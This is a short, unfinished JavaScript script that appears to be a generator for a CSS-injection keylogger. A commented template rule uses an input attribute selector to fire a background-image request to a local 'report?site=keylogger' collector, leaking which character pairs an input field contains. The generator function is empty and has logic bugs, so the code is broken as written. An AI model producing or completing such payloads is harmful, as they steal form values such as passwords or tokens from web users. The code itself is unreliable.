let fs = require("fs");

// input[value*="ca"] ~ #ca {
//     color: var(--hightlight);
//     background: url("http://localhost:3000/report?site=keylogger&payload=ca");
// }

function genAllCharPairs(chars) {
    let res = [];
    const dfs = function (curArr) {
        if (curArr.length === 2) {
            res.push(Array.from(curArr));
        } else {
            for (let c of chars) {
                curArr.push(c);
                dfs(curArr);
                curArr.pop();
            }
        }
    };
    dfs([], {});
    return res.map(item => item.join(''));
}

function genCSS(pairs) {
    for (let pair in pairs) {
        if (!"_" in pair) {

        }
    }
}

// const allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_";
const allChars = "abcde_";
let allPairs = genAllCharPairs(allChars);
genCSS(allPairs);

